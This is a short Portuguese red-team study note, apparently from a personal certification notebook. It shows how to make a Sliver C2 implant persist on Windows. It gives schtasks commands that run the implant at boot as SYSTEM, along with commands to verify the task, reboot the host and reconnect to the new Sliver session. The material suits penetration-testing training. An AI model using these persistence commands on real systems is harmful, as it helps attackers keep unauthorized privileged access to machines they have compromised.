> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/sliver-c2/pivoting-and-persistence/persistence/scheduled-task.md).

# Scheduled Task

**Objetivo**

Garantir que o **implant do Sliver execute automaticamente no boot**, mantendo acesso após reinicialização.

**Criar tarefa agendada**

```
schtasks /create /tn "Hacksmarter" /tr "C:\Users\t.ramsbey\persistence.exe" /sc onstart /ru system
```

Parâmetros:

* `/create` → cria tarefa
* `/tn` → nome da tarefa
* `/tr` → caminho do executável
* `/sc onstart` → executa no boot
* `/ru system` → roda como **SYSTEM**

Sem privilégio admin:

```
schtasks /create /tn "Hacksmarter" /tr "C:\Users\t.ramsbey\persistence.exe" /sc onstart
```

**Confirmar criação**

```
schtasks /query /tn "Hacksmarter"
```

**Reiniciar máquina**

```
shutdown /r /t 0
```

**Verificar persistência no Sliver**

```
sessions
sessions -i <new_session_id>
whoami
```
